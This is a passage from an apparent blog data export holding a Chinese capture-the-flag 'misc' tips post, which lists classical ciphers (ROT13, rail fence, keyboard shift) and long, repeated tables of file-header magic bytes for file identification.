Corel Draw cdr CDR\n\n   CAD dwg 0x41433130\n\n   Adobe Photoshop psd 8BPS\n\n   Rich Text Format rtf rtf\n\n   XML xml\n\n   HTML html;htm;[PHP](http://lib.csdn.net/base/php);php3;php4;phtml;shtml type\n\n   Email eml Delivery-date:\n\n   Outlook Express dbx 0xCFAD12FE\n\n   Outlookpst!BDN\n\n   MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1\n\n   MS Access mdb;mda;mde;mdt Standard J\n\n   WordPerfect wpd 0xFF575043\n\n   OpenOffice Writer sxw writer\n\n   OpenOffice Calc sxc calc\n\n   OpenOffice Math sxm math\n\n   OpenOffice Impress sxi impress\n\n   OpenOffice Draw sxd draw\n\n   Adobe FrameMaker fm <MAKERFILE\n\n   PostScript eps.or.ps;ps;eps %!PS-Adobe\n\n   Adobe Acrobat pdf %PDF-1.\n\n   Quicken qdf 0xAC9EBD8F\n\n   QuickBooks Backup qbb 0x458600000600\n\n   Sage sly.or.srt.or.slt;sly;srt;slt0x53520100\n\n   Sage Backup 1 SAGEBACKUP\n\n   Lotus WordPro v9 lwp 0x576F726450726F\n\n   Lotus 123 v9 123 0x00001A00051004\n\n   Lotus 123 v5 wk4 0x00001A0002100400\n\n   Lotus 123 v3 wk3 0x00001A0000100400\n\n   Lotus 123 v1 wk1 0x2000604060\n\n   Windows Password pwl 0xE3828596\n\n   ZIP Archive zip;jar 0x504B0304\n\n   ZIP Archive (outdated) zip 0x504B3030\n\n   RAR Archive rar Rar!\n\n   GZ Archive gz;tgz 0x1F8B08\n\n   BZIP Archive bz2 BZh\n\n   ARJ Archive arj 0x60EA\n\n   7-ZIP Archive 7z 7z集'\n\n   Wave wav WAVE\n\n   AVI avi AVI\n\n   Real Audio ram;ra .ra?0\n\n   Real Media rm .RMF\n\n   MPEG mpg;mpeg 0x000001BA\n\n   MPEG mpg;mpeg 0x000001B3\n\n   Quicktime mov moov\n\n   Windows Media asf 0x3026B2758E66CF11\n\n   MIDI mid MThd\n\n   Win32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ\n\n   Win16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ\n\n   ELF Executable elf;; 0x7F454C4601010100\n\n6. 各种文件类型文件头标志位详细列表 \n\n   FFD8FFFE00, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\n   FFD8FFE000, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\n   474946383961, .gif, \"GIF 89A\"\n\n   474946383761, .gif, \"GIF 87A\"\n\n   424D, .bmp, \"Windows Bitmap\"\n\n   4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;\n\n   .cpl;.x32, \"Executable File\"\n\n   504B0304, .zip, \"Zip Compressed\"\n\n   3A42617365, .cnt, \"\"\n\n   D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, \"MS Compound Document v1 or Lotus Approach APRfile\"\n\n   0100000058000000, .emf, \"\"\n\n   03000000C466C456, .evt, \"\"\n\n   3F5F0300, .gid;.hlp;.lhp, \"Windows HelpFile\"\n\n   1F8B08, .gz, \"GZ Compressed File\"\n\n   28546869732066696C65, .hqx, \"\"\n\n   0000010000, .ico, \"Icon File\"\n\n   4C000000011402, .lnk, \"Windows LinkFile\"\n\n   25504446, .pdf, \"Adobe PDF File\"\n\n   5245474544495434, .reg, \"\"\n\n   7B5C727466,.rtf, \"Rich Text Format File\"\n\n   lh, .lzh, \"Lz compression file\"\n\n   MThd, .mid, \"\"\n\n   0A050108, .pcx, \"\"\n\n   25215053, .eps, \"Adobe EPS File\"\n\n   2112, .ain, \"AIN Archive File\"\n\n   1A02, .arc, \"ARC/PKPAK Compressed 1\"\n\n   1A03, .arc, \"ARC/PKPAK Compressed 2\"\n\n   1A04, .arc, \"ARC/PKPAK Compressed 3\"\n\n   1A08, .arc, \"ARC/PKPAK Compressed 4\"\n\n   1A09, .arc, \"ARC/PKPAK Compressed 5\"\n\n   60EA, .arj, \"ARJ Compressed\"\n\n   41564920, .avi, \"Audio Video Interleave(AVI)\"\n\n   425A68, .bz;.bz2, \"Bzip Archive\"\n\n   49536328, .cab, \"Cabinet File\"\n\n   4C01, .obj, \"Compiled Object Module\"\n\n   303730373037, .tar;.cpio, \"CPIO ArchiveFile\"\n\n   4352555348, .cru;.crush, \"CRUSH ArchiveFile\"\n\n   3ADE68B1, .dcx, \"DCX Graphic File\"\n\n   1F8B, .gz;.tar;.tgz, \"Gzip ArchiveFile\"\n\n   91334846, .hap, \"HAP Archive File\"\n\n   3C68746D6C3E,.htm;.html, \"HyperText Markup Language 1\"\n\n   3C48544D4C3E,.htm;.html, \"HyperText Markup Language 2\"\n\n   3C21444F4354, .htm;.html, \"HyperText MarkupLanguage 3\"\n\n   100, .ico, \"ICON File\"\n\n   5F27A889, .jar, \"JAR Archive File\"\n\n   2D6C68352D,.lha, \"LHA Compressed\"\n\n   20006040600, .wk1;.wks, \"Lotus 123 v1 Worksheet\"\n\n   00001A0007800100, .fm3, \"Lotus 123 v3 FMTfile\"\n\n   00001A0000100400, .wk3, \"Lotus 123 v3Worksheet\"\n\n   20006800200, .fmt, \"Lotus 123 v4 FMTfile\"\n\n   00001A0002100400, .wk4, \"Lotus 123 v5\"\n\n   5B7665725D, .ami, \"Lotus Ami Pro\"\n\n   300000041505052, .adx, \"Lotus ApproachADX file\"\n\n   1A0000030000, .nsf;.ntf, \"Lotus NotesDatabase/Template\"\n\n   4D47582069747064, .ds4, \"MicrografixDesigner 4\"\n\n   4D534346, .cab, \"Microsoft CAB FileFormat\"\n\n   4D546864, .mid, \"Midi Audio File\"\n\n   000001B3, .mpg;.mpeg, \"MPEG Movie\"\n\n   0902060000001000B9045C00, .xls, \"MS Excel v2\"\n\n   0904060000001000F6055C00, .xls, \"MS Excel v4\"\n\n   7FFE340A,.doc, \"MS Word\"\n\n   1234567890FF, .doc, \"MS Word 6.0\"\n\n   31BE000000AB0000, .doc, \"MS Word forDOS 6.0\"\n\n   1A00000300001100, .nsf, \"NotesDatabase\"\n\n   7E424B00, .psp, \"PaintShop Pro Image File\"\n\n   504B0304, .zip, \"PKZIP Compressed\"\n\n   89504E470D0A, .png, \"PNG Image File\"\n\n   6D646174, .mov, \"QuickTime Movie\"\n\n   6D646174, .qt, \"Quicktime MovieFile\"\n\n   52617221, .rar, \"RAR Archive File\"\n\n   2E7261FD, .ra;.ram, \"Real AudioFile\"\n\n   EDABEEDB, .rpm, \"RPM Archive File\"\n\n   2E736E64, .au, \"SoundMachine AudioFile\"\n\n   53495421, .sit, \"Stuffit v1 ArchiveFile\"\n\n   53747566664974, .sit, \"Stuffit v5Archive File\"\n\n   1F9D, .z, \"TAR Compressed ArchiveFile\"\n\n   49492A, .tif;.tiff, \"TIFF (Intel)\"\n\n   4D4D2A,.tif;.tiff, \"TIFF (Motorola)\"\n\n   554641, .ufa, \"UFA Archive File\"\n\n   57415645666D74, .wav, \"Wave Files\"\n\n   D7CDC69A,.wmf, \"Windows Meta File\"\n\n   4C000000, .lnk, \"Windows Shortcut (LinkFile)\"\n\n   504B3030504B0304, .zip, \"WINZIPCompressed\"\n\n   FF575047, .wpg, \"WordPerfectGraphics\"\n\n   FF575043, .wp, \"WordPerfect v5 orv6\"\n\n   3C3F786D6C,.xml, \"XML Document\"\n\n   FFFE3C0052004F004F0054005300540055004200, .xml, \"XML Document(ROOTSTUB)\"\n\n   3C21454E54495459, .dtd, \"XML DTD\"\n\n   5A4F4F20, .zoo, \"ZOO Archive File\"\n\n7. 如果有fireworks的字样，可以使用Adobe Fireworks打开\n\n8. U2Fsd特征易知是AES加密的密文,使用解密网站，密钥为空","slug":"misc思路","published":1,"updated":"2018-06-22T07:25:09.854Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpd000ely4jtf0cssj3","content":"<ol>\n<li><p>凯撒13世 rot13</p>\n</li>\n<li><p>roqtp697t95j3 对应键盘下一行</p>\n</li>\n<li><p>栅栏密码</p>\n<a id=\"more\"></a>\n</li>\n<li><p>各种文件头</p>\n<p>JPEG (jpg)，文件头：FFD8FF</p>\n<p>PNG (png)，文件头：89504E47</p>\n<p>GIF (gif)，文件头：47494638</p>\n<p>TIFF (tif)，文件头：49492A00</p>\n<p>Windows Bitmap (bmp)，文件头：424D</p>\n<p>CAD (dwg)，文件头：41433130</p>\n<p>Adobe Photoshop (psd)，文件头：38425053</p>\n<p>Rich Text Format (rtf)，文件头：7B5C727466</p>\n<p>XML (xml)，文件头：3C3F786D6C</p>\n<p>HTML (html)，文件头：68746D6C3E</p>\n<p>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</p>\n<p>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</p>\n<p>Outlook (pst)，文件头：2142444E</p>\n<p>zlib                                       789C  x\\xda</p>\n<p>gzip                                       1f8b08</p>\n<p>lzma                                                         6c00                                                                 </p>\n<p>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</p>\n<p>MS Access (mdb)，文件头：5374616E64617264204A</p>\n<p>WordPerfect (wpd)，文件头：FF575043</p>\n<p>Postscript (eps.or.ps)，文件头：252150532D41646F6265</p>\n<p>Adobe Acrobat (pdf)，文件头：255044462D312E</p>\n<p>Quicken (qdf)，文件头：AC9EBD8F</p>\n<p>Windows Password (pwl)，文件头：E3828596</p>\n<p>ZIP Archive (zip)，文件头：504B0304</p>\n<p>RAR Archive (rar)，文件头：52617221</p>\n<p>Wave (wav)，文件头：57415645</p>\n<p>AVI (avi)，文件头：41564920</p>\n<p>Real Audio (ram)，文件头：2E7261FD</p>\n<p>Real Media (rm)，文件头：2E524D46</p>\n<p>MPEG (mpg)，文件头：000001BA</p>\n<p>MPEG (mpg)，文件头：000001B3</p>\n<p>Quicktime (mov)，文件头：6D6F6F76</p>\n<p>Windows Media (asf)，文件头：3026B2758E66CF11</p>\n<p>MIDI (mid)，文件头：4D546864</p>\n</li>\n<li><p>从winhex中取出的文件头列表</p>\n<p>File Type ExtensionsHeader</p>\n<p>JPEG jpg;jpeg 0xFFD8FF</p>\n<p>PNG png 0x89504E470D0A1A0A</p>\n<p>GIF gif GIF8</p>\n<p>TIFF tif;tiff 0x49492A00</p>\n<p>TIFF tif;tiff 0x4D4D002A</p>\n<p>Bit map bmp BM</p>\n<p>AOL ART art 0x4A47040E000000</p>\n<p>AOL ART art 0x4A47030E000000</p>\n<p>PC Paintbrush pcx 0x0A050108</p>\n<p>Graphics Metafile wmf 0xD7CDC69A</p>\n<p>Graphics Metafile wmf 0x01000900</p>\n<p>Graphics Metafile wmf 0x02000900</p>\n<p>Enhanced Metafile emf 0x0100000058000000</p>\n<p>Corel Draw cdr CDR</p>\n<p>CAD dwg 0x41433130</p>\n<p>Adobe Photoshop psd 8BPS</p>\n<p>Rich Text Format rtf rtf</p>\n<p>XML xml</p>\n<p>HTML html;htm;<a href=\"http://lib.csdn.net/base/php\" target=\"_blank\" rel=\"noopener\">PHP</a>;php3;php4;phtml;shtml type</p>\n<p>Email eml Delivery-date:</p>\n<p>Outlook Express dbx 0xCFAD12FE</p>\n<p>Outlookpst!BDN</p>\n<p>MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1</p>\n<p>MS Access mdb;mda;mde;mdt Standard J</p>\n<p>WordPerfect wpd 0xFF575043</p>\n<p>OpenOffice Writer sxw writer</p>\n<p>OpenOffice Calc sxc calc</p>\n<p>OpenOffice Math sxm math</p>\n<p>OpenOffice Impress sxi impress</p>\n<p>OpenOffice Draw sxd draw</p>\n<p>Adobe FrameMaker fm &lt;MAKERFILE</p>\n<p>PostScript eps.or.ps;ps;eps %!PS-Adobe</p>\n<p>Adobe Acrobat pdf %PDF-1.</p>\n<p>Quicken qdf 0xAC9EBD8F</p>\n<p>QuickBooks Backup qbb 0x458600000600</p>\n<p>Sage sly.or.srt.or.slt;sly;srt;slt0x53520100</p>\n<p>Sage Backup 1 SAGEBACKUP</p>\n<p>Lotus WordPro v9 lwp 0x576F726450726F</p>\n<p>Lotus 123 v9 123 0x00001A00051004</p>\n<p>Lotus 123 v5 wk4 0x00001A0002100400</p>\n<p>Lotus 123 v3 wk3 0x00001A0000100400</p>\n<p>Lotus 123 v1 wk1 0x2000604060</p>\n<p>Windows Password pwl 0xE3828596</p>\n<p>ZIP Archive zip;jar 0x504B0304</p>\n<p>ZIP Archive (outdated) zip 0x504B3030</p>\n<p>RAR Archive rar Rar!</p>\n<p>GZ Archive gz;tgz 0x1F8B08</p>\n<p>BZIP Archive bz2 BZh</p>\n<p>ARJ Archive arj 0x60EA</p>\n<p>7-ZIP Archive 7z 7z集’</p>\n<p>Wave wav WAVE</p>\n<p>AVI avi AVI</p>\n<p>Real Audio ram;ra .ra?0</p>\n<p>Real Media rm .RMF</p>\n<p>MPEG mpg;mpeg 0x000001BA</p>\n<p>MPEG mpg;mpeg 0x000001B3</p>\n<p>Quicktime mov moov</p>\n<p>Windows Media asf 0x3026B2758E66CF11</p>\n<p>MIDI mid MThd</p>\n<p>Win32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ</p>\n<p>Win16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ</p>\n<p>ELF Executable elf;; 0x7F454C4601010100</p>\n</li>\n<li><p>各种文件类型文件头标志位详细列表 </p>\n<p>FFD8FFFE00, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>FFD8FFE000, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>474946383961, .gif, “GIF 89A”</p>\n<p>474946383761, .gif, “GIF 87A”</p>\n<p>424D, .bmp, “Windows Bitmap”</p>\n<p>4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;</p>\n<p>.cpl;.x32, “Executable File”</p>\n<p>504B0304, .zip, “Zip Compressed”</p>\n<p>3A42617365, .cnt, “”</p>\n<p>D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, “MS Compound Document v1 or Lotus Approach APRfile”</p>\n<p>0100000058000000, .emf, “”</p>\n<p>03000000C466C456, .evt, “”</p>\n<p>3F5F0300, .gid;.hlp;.lhp, “Windows HelpFile”</p>\n<p>1F8B08, .gz, “GZ Compressed File”</p>\n<p>28546869732066696C65, .hqx, “”</p>\n<p>0000010000, .ico, “Icon File”</p>\n<p>4C000000011402, .lnk, “Windows LinkFile”</p>\n<p>25504446, .pdf, “Adobe PDF File”</p>\n<p>5245474544495434, .reg, “”</p>\n<p>7B5C727466,.rtf, “Rich Text Format File”</p>\n<p>lh, .lzh, “Lz compression file”</p>\n<p>MThd, .mid, “”</p>\n<p>0A050108, .pcx, “”</p>\n<p>25215053, .eps, “Adobe EPS File”</p>\n<p>2112, .ain, “AIN Archive File”</p>\n<p>1A02, .arc, “ARC/PKPAK Compressed 1”</p>\n<p>1A03, .arc, “ARC/PKPAK Compressed 2”</p>\n<p>1A04, .arc, “ARC/PKPAK Compressed 3”</p>\n<p>1A08, .arc, “ARC/PKPAK Compressed 4”</p>\n<p>1A09, .arc, “ARC/PKPAK Compressed 5”</p>\n<p>60EA, .arj, “ARJ Compressed”</p>\n<p>41564920, .avi, “Audio Video Interleave(AVI)”</p>\n<p>425A68, .bz;.bz2, “Bzip Archive”</p>\n<p>49536328, .cab, “Cabinet File”</p>\n<p>4C01, .obj, “Compiled Object Module”</p>\n<p>303730373037, .tar;.cpio, “CPIO ArchiveFile”</p>\n<p>4352555348, .cru;.crush, “CRUSH ArchiveFile”</p>\n<p>3ADE68B1, .dcx, “DCX Graphic File”</p>\n<p>1F8B, .gz;.tar;.tgz, “Gzip ArchiveFile”</p>\n<p>91334846, .hap, “HAP Archive File”</p>\n<p>3C68746D6C3E,.htm;.html, “HyperText Markup Language 1”</p>\n<p>3C48544D4C3E,.htm;.html, “HyperText Markup Language 2”</p>\n<p>3C21444F4354, .htm;.html, “HyperText MarkupLanguage 3”</p>\n<p>100, .ico, “ICON File”</p>\n<p>5F27A889, .jar, “JAR Archive File”</p>\n<p>2D6C68352D,.lha, “LHA Compressed”</p>\n<p>20006040600, .wk1;.wks, “Lotus 123 v1 Worksheet”</p>\n<p>00001A0007800100, .fm3, “Lotus 123 v3 FMTfile”</p>\n<p>00001A0000100400, .wk3, “Lotus 123 v3Worksheet”</p>\n<p>20006800200, .fmt, “Lotus 123 v4 FMTfile”</p>\n<p>00001A0002100400, .wk4, “Lotus 123 v5”</p>\n<p>5B7665725D, .ami, “Lotus Ami Pro”</p>\n<p>300000041505052, .adx, “Lotus ApproachADX file”</p>\n<p>1A0000030000, .nsf;.ntf, “Lotus NotesDatabase/Template”</p>\n<p>4D47582069747064, .ds4, “MicrografixDesigner 4”</p>\n<p>4D534346, .cab, “Microsoft CAB FileFormat”</p>\n<p>4D546864, .mid, “Midi Audio File”</p>\n<p>000001B3, .mpg;.mpeg, “MPEG Movie”</p>\n<p>0902060000001000B9045C00, .xls, “MS Excel v2”</p>\n<p>0904060000001000F6055C00, .xls, “MS Excel v4”</p>\n<p>7FFE340A,.doc, “MS Word”</p>\n<p>1234567890FF, .doc, “MS Word 6.0”</p>\n<p>31BE000000AB0000, .doc, “MS Word forDOS 6.0”</p>\n<p>1A00000300001100, .nsf, “NotesDatabase”</p>\n<p>7E424B00, .psp, “PaintShop Pro Image File”</p>\n<p>504B0304, .zip, “PKZIP Compressed”</p>\n<p>89504E470D0A, .png, “PNG Image File”</p>\n<p>6D646174, .mov, “QuickTime Movie”</p>\n<p>6D646174, .qt, “Quicktime MovieFile”</p>\n<p>52617221, .rar, “RAR Archive File”</p>\n<p>2E7261FD, .ra;.ram, “Real AudioFile”</p>\n<p>EDABEEDB, .rpm, “RPM Archive File”</p>\n<p>2E736E64, .au, “SoundMachine AudioFile”</p>\n<p>53495421, .sit, “Stuffit v1 ArchiveFile”</p>\n<p>53747566664974, .sit, “Stuffit v5Archive File”</p>\n<p>1F9D, .z, “TAR Compressed ArchiveFile”</p>\n<p>49492A, .tif;.tiff, “TIFF (Intel)”</p>\n<p>4D4D2A,.tif;.tiff, “TIFF (Motorola)”</p>\n<p>554641, .ufa, “UFA Archive File”</p>\n<p>57415645666D74, .wav, “Wave Files”</p>\n<p>D7CDC69A,.wmf, “Windows Meta File”</p>\n<p>4C000000, .lnk, “Windows Shortcut (LinkFile)”</p>\n<p>504B3030504B0304, .zip, “WINZIPCompressed”</p>\n<p>FF575047, .wpg, “WordPerfectGraphics”</p>\n<p>FF575043, .wp, “WordPerfect v5 orv6”</p>\n<p>3C3F786D6C,.xml, “XML Document”</p>\n<p>FFFE3C0052004F004F0054005300540055004200, .xml, “XML Document(ROOTSTUB)”</p>\n<p>3C21454E54495459, .dtd, “XML DTD”</p>\n<p>5A4F4F20, .zoo, “ZOO Archive File”</p>\n</li>\n<li><p>如果有fireworks的字样，可以使用Adobe Fireworks打开</p>\n</li>\n<li><p>U2Fsd特征易知是AES加密的密文,使用解密网站，密钥为空</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"<ol>\n<li><p>凯撒13世 rot13</p>\n</li>\n<li><p>roqtp697t95j3 对应键盘下一行</p>\n</li>\n<li><p>栅栏密码</p>","more":"</li>\n<li><p>各种文件头</p>\n<p>JPEG (jpg)，文件头：FFD8FF</p>\n<p>PNG (png)，文件头：89504E47</p>\n<p>GIF (gif)，文件头：47494638</p>\n<p>TIFF (tif)，文件头：49492A00</p>\n<p>Windows Bitmap (bmp)，文件头：424D</p>\n<p>CAD (dwg)，文件头：41433130</p>\n<p>Adobe Photoshop (psd)，文件头：38425053</p>\n<p>Rich Text Format (rtf)，文件头：7B5C727466</p>\n<p>XML (xml)，文件头：3C3F786D6C</p>\n<p>HTML (html)，文件头：68746D6C3E</p>\n<p>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</p>\n<p>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</p>\n<p>Outlook (pst)，文件头：2142444E</p>\n<p>zlib                                       789C  x\\xda</p>\n<p>gzip                                       1f8b08</p>\n<p>lzma                                                         6c00                                                                 </p>\n<p>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</p>\n<p>MS Access (mdb)，文件头：5374616E64617264204A</p>\n<p>WordPerfect (wpd)，文件头：FF575043</p>\n<p>Postscript (eps.or.ps)，文件头：252150532D41646F6265</p>\n<p>Adobe Acrobat (pdf)，文件头：255044462D312E</p>\n<p>Quicken (qdf)，文件头：AC9EBD8F</p>\n<p>Windows Password (pwl)，文件头：E3828596</p>\n<p>ZIP Archive (zip)，文件头：504B0304</p>\n<p>RAR Archive (rar)，文件头：52617221</p>\n<p>Wave (wav)，文件头：57415645</p>\n<p>AVI (avi)，文件头：41564920</p>\n<p>Real Audio (ram)，文件头：2E7261FD</p>\n<p>Real Media (rm)，文件头：2E524D46</p>\n<p>MPEG (mpg)，文件头：000001BA</p>\n<p>MPEG (mpg)，文件头：000001B3</p>\n<p>Quicktime (mov)，文件头：6D6F6F76</p>\n<p>Windows Media (asf)，文件头：3026B2758E66CF11</p>\n<p>MIDI (mid)，文件头：4D546864</p>\n</li>\n<li><p>从winhex中取出的文件头列表</p>\n<p>File Type ExtensionsHeader</p>\n<p>JPEG jpg;jpeg 0xFFD8FF</p>\n<p>PNG png 0x89504E470D0A1A0A</p>\n<p>GIF gif GIF8</p>\n<p>TIFF tif;tiff 0x49492A00</p>\n<p>TIFF tif;tiff 0x4D4D002A</p>\n<p>Bit map bmp BM</p>\n<p>AOL ART art 0x4A47040E000000</p>\n<p>AOL ART art 0x4A47030E000000</p>\n<p>PC Paintbrush pcx 0x0A050108</p>\n<p>Graphics Metafile wmf 0xD7CDC69A</p>\n<p>Graphics Metafile wmf 0x01000900</p>\n<p>Graphics Metafile wmf 0x02000900</p>\n<p>Enhanced Metafile emf 0x0100000058000000</p>\n<p>Corel Draw cdr CDR</p>\n<p>CAD dwg 0x41433130</p>\n<p>Adobe Photoshop psd 8BPS</p>\n<p>Rich Text Format rtf rtf</p>\n<p>XML xml</p>\n<p>HTML html;htm;<a href=\"http://lib.csdn.net/base/php\" target=\"_blank\" rel=\"noopener\">PHP</a>;php3;php4;phtml;shtml type</p>\n<p>Email eml Delivery-date:</p>\n<p>Outlook Express dbx 0xCFAD12FE</p>\n<p>Outlookpst!BDN</p>\n<p>MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1</p>\n<p>MS Access mdb;mda;mde;mdt Standard J</p>\n<p>WordPerfect wpd 0xFF575043</p>\n<p>OpenOffice Writer sxw writer</p>\n<p>OpenOffice Calc sxc calc</p>\n<p>OpenOffice Math sxm math</p>\n<p>OpenOffice Impress sxi impress</p>\n<p>OpenOffice Draw sxd draw</p>\n<p>Adobe FrameMaker fm &lt;MAKERFILE</p>\n<p>PostScript eps.or.ps;ps;eps %!PS-Adobe</p>\n<p>Adobe Acrobat pdf %PDF-1.</p>\n<p>Quicken qdf 0xAC9EBD8F</p>\n<p>QuickBooks Backup qbb 0x458600000600</p>\n<p>Sage sly.or.srt.or.slt;sly;srt;slt0x53520100</p>\n<p>Sage Backup 1 SAGEBACKUP</p>\n<p>Lotus WordPro v9 lwp 0x576F726450726F</p>\n<p>Lotus 123 v9 123 0x00001A00051004</p>\n<p>Lotus 123 v5 wk4 0x00001A0002100400</p>\n<p>Lotus 123 v3 wk3 0x00001A0000100400</p>\n<p>Lotus 123 v1 wk1 0x2000604060</p>\n<p>Windows Password pwl 0xE3828596</p>\n<p>ZIP Archive zip;jar 0x504B0304</p>\n<p>ZIP Archive (outdated) zip 0x504B3030</p>\n<p>RAR Archive rar Rar!</p>\n<p>GZ Archive gz;tgz 0x1F8B08</p>\n<p>BZIP Archive bz2 BZh</p>\n<p>ARJ Archive arj 0x60EA</p>\n<p>7-ZIP Archive 7z 7z集’</p>\n<p>Wave wav WAVE</p>\n<p>AVI avi AVI</p>\n<p>Real Audio ram;ra .ra?0</p>\n<p>Real Media rm .RMF</p>\n<p>MPEG mpg;mpeg 0x000001BA</p>\n<p>MPEG mpg;mpeg 0x000001B3</p>\n<p>Quicktime mov moov</p>\n<p>Windows Media asf 0x3026B2758E66CF11</p>\n<p>MIDI mid MThd</p>\n<p>Win32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ</p>\n<p>Win16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ</p>\n<p>ELF Executable elf;; 0x7F454C4601010100</p>\n</li>\n<li><p>各种文件类型文件头标志位详细列表 </p>\n<p>FFD8FFFE00, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>FFD8FFE000, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>474946383961, .gif, “GIF 89A”</p>\n<p>474946383761, .gif, “GIF 87A”</p>\n<p>424D, .bmp, “Windows Bitmap”</p>\n<p>4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;</p>\n<p>.cpl;.x32, “Executable File”</p>\n<p>504B0304, .zip, “Zip Compressed”</p>\n<p>3A42617365, .cnt, “”</p>\n<p>D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, “MS Compound Document v1 or Lotus Approach APRfile”</p>\n<p>0100000058000000, .emf, “”</p>\n<p>03000000C466C456, .evt, “”</p>\n<p>3F5F0300, .gid;.hlp;.lhp, “Windows HelpFile”</p>\n<p>1F8B08, .gz, “GZ Compressed File”</p>\n<p>28546869732066696C65, .hqx, “”</p>\n<p>0000010000, .ico, “Icon File”</p>\n<p>4C000000011402, .lnk, “Windows LinkFile”</p>\n<p>25504446, .pdf, “Adobe PDF File”</p>\n<p>5245474544495434, .reg, “”</p>\n<p>7B5C727466,.rtf, “Rich Text Format File”</p>\n<p>lh, .lzh, “Lz compression file”</p>\n<p>MThd, .mid, “”</p>\n<p>0A050108, .pcx, “”</p>\n<p>25215053, .eps, “Adobe EPS File”</p>\n<p>2112, .ain, “AIN Archive File”</p>\n<p>1A02, .arc, “ARC/PKPAK Compressed 1”</p>\n<p>1A03, .arc, “ARC/PKPAK Compressed 2”</p>\n<p>1A04, .arc, “ARC/PKPAK Compressed 3”</p>\n<p>1A08, .arc, “ARC/PKPAK Compressed 4”</p>\n<p>1A09, .arc, “ARC/PKPAK Compressed 5”</p>\n<p>60EA, .arj, “ARJ Compressed”</p>\n<p>41564920, .avi, “Audio Video Interleave(AVI)”</p>\n<p>425A68, .bz;.bz2, “Bzip Archive”</p>\n<p>49536328, .cab, “Cabinet File”</p>\n<p>4C01, .obj, “Compiled Object Module”</p>\n<p>303730373037, .tar;.cpio, “CPIO ArchiveFile”</p>\n<p>4352555348, .cru;.crush, “CRUSH ArchiveFile”</p>\n<p>3ADE68B1, .dcx, “DCX Graphic File”</p>\n<p>1F8B, .gz;.tar;.tgz, “Gzip ArchiveFile”</p>\n<p>91334846, .hap, “HAP Archive File”</p>\n<p>3C68746D6C3E,.htm;.html, “HyperText Markup Language 1”</p>\n<p>3C48544D4C3E,.htm;.html, “HyperText Markup Language 2”</p>\n<p>3C21444F4354, .htm;.html, “HyperText MarkupLanguage 3”</p>\n<p>100, .ico, “ICON File”</p>\n<p>5F27A889, .jar, “JAR Archive File”</p>\n<p>2D6C68352D,.lha, “LHA Compressed”</p>\n<p>20006040600, .wk1;.wks, “Lotus 123 v1 Worksheet”</p>\n<p>00001A0007800100, .fm3, “Lotus 123 v3 FMTfile”</p>\n<p>00001A0000100400, .wk3, “Lotus 123 v3Worksheet”</p>\n<p>20006800200, .fmt, “Lotus 123 v4 FMTfile”</p>\n<p>00001A0002100400, .wk4, “Lotus 123 v5”</p>\n<p>5B7665725D, .ami, “Lotus Ami Pro”</p>\n<p>300000041505052, .adx, “Lotus ApproachADX file”</p>\n<p>1A0000030000, .nsf;.ntf, “Lotus NotesDatabase/Template”</p>\n<p>4D47582069747064, .ds4, “MicrografixDesigner 4”</p>\n<p>4D534346, .cab, “Microsoft CAB FileFormat”</p>\n<p>4D546864, .mid, “Midi Audio File”</p>\n<p>000001B3, .mpg;.mpeg, “MPEG Movie”</p>\n<p>0902060000001000B9045C00, .xls, “MS Excel v2”</p>\n<p>0904060000001000F6055C00, .xls, “MS Excel v4”</p>\n<p>7FFE340A,.doc, “MS Word”</p>\n<p>1234567890FF, .doc, “MS Word 6.0”</p>\n<p>31BE000000AB0000, .doc, “MS Word forDOS 6.0”</p>\n<p>1A00000300001100, .nsf, “NotesDatabase”</p>\n<p>7E424B00, .psp, “PaintShop Pro Image File”</p>\n<p>504B0304, .zip, “PKZIP Compressed”</p>\n<p>89504E470D0A, .png, “PNG Image File”</p>\n<p>6D646174, .mov, “QuickTime Movie”</p>\n<p>6D646174, .qt, “Quicktime MovieFile”</p>\n<p>52617221, .rar, “RAR Archive File”</p>\n<p>2E7261FD, .ra;.ram, “Real AudioFile”</p>\n<p>EDABEEDB, .rpm, “RPM Archive File”</p>\n<p>2E736E64, .au, “SoundMachine AudioFile”</p>\n<p>53495421, .sit, “Stuffit v1 ArchiveFile”</p>\n<p>53747566664974, .sit, “Stuffit v5Archive File”</p>\n<p>1F9D, .z, “TAR Compressed ArchiveFile”</p>\n<p>49492A, .tif;.tiff, “TIFF (Intel)”</p>\n<p>4D4D2A,.tif;.tiff, “TIFF (Motorola)”</p>\n<p>554641, .ufa, “UFA Archive File”</p>\n<p>57415645666D74, .wav, “Wave Files”</p>\n<p>D7CDC69A,.wmf, “Windows Meta File”</p>\n<p>4C000000, .lnk, “Windows Shortcut (LinkFile)”</p>\n<p>504B3030504B0304, .zip, 